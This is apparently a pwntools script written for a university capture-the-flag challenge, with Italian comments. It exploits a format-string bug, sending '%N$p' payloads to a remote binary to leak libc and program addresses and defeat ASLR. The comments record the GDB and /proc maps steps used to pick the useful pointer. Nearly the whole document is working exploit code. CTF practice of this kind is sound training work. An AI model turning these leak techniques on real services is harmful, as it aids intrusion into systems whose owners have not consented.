from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50230

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin', env={"LD_PRELOAD": "./libc.so.6"})

conn.sendlineafter(b"> ", b"%1$p")
first_address = (conn.recvline(keepends=False).decode())
intresting_part = first_address[:6]                         # Based on the results of info proc mapping
print(intresting_part)

for i in range(1,100):                                      # Print all the pointers close to the libc range
    conn.sendlineafter(b"> ", f"%{i}$p".encode())
    pointer = conn.recvline(keepends=False).decode()
    if(intresting_part in pointer):
        print(f"{i} - {pointer}")

intresting_part = "0x40"                                    # Print all the pointers close to the process start address
print(intresting_part)
for i in range(1,100):
    conn.sendlineafter(b"> ", f"%{i}$p".encode())
    pointer = conn.recvline(keepends=False).decode()
    if(intresting_part in pointer):
        print(f"{i} - {pointer}")

conn.interactive()

# Avvio il programma in locale, in modo da sapere il PID del processo.
# Leak di qualche puntatore tramite %p
# Uso sudo cat /proc/<PID>/maps
# Guardo dentro al maps quali sono gli indirizzi che effettivamente interagiscono con libc
# Capisco che nel nostro caso il 1° e 3° puntatore sono utili. Esempio di puntatore: 0x72cf76e28189
# Avvio GDB, fisso un breakpoint prima che il processo jumpi nuovamente
# Tramite x/64gx 0x72cf76e28189 vediamo le varie chiamate successive a quell'indirizzo
# Alternativamente info symbol 0x72cf76e28189. Mi dice cosa sta chiamando: __libc_start_main + 137 

# Usiamo il 37
